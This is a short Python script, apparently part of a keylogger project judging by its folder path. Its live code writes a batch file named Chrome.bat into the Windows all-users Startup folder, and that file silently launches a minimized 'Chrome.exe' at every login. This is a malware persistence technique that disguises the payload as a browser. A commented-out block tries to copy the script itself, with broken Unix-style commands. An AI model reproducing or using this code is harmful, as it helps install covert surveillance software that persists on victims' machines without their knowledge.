from sys import argv
import subprocess

'''
c:\\Users\\Claudio\\Desktop\\KEYLOGGER_PYTHON\\

directorio = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
subprocess.call (['touch',Chrome,directorio])

script = argv
name = str(script[0])
directorio= 'C:'

subprocess.call(['cp',name,directorio])
'''

archi1= open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Chrome.bat',"w") 
archi1.write("@echo off \n") 
archi1.write("cd C:\Programs\Chrome\n") 
archi1.write("start /MIN Chrome.exe\n")  
archi1.close() 